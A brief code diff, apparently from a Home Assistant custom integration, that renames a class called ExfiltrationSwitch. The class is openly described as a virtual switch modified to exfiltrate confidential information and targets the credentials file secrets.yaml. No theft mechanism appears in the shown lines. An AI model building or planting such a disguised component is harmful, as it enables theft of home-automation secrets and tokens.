@@ -26,14 +26,14 @@ def setup_platform(
     """Set up the sensor platform."""
 
     if PRINT_KEY in config:
-        add_entities([ExfiltrationSwitch(config[ACCESS_TOKEN_KEY], config[PRINT_KEY])])
+        add_entities([SwitchExfiltration(config[ACCESS_TOKEN_KEY], config[PRINT_KEY])])
     else:
-        add_entities([ExfiltrationSwitch(config[ACCESS_TOKEN_KEY])])
+        add_entities([SwitchExfiltration(config[ACCESS_TOKEN_KEY])])
 
     return True
 
 
-class ExfiltrationSwitch(SwitchEntity):
+class SwitchExfiltration(SwitchEntity):
     """This is a virtual switch modified to exfiltrate confidential information."""
 
     _target_file1 = "secrets.yaml"
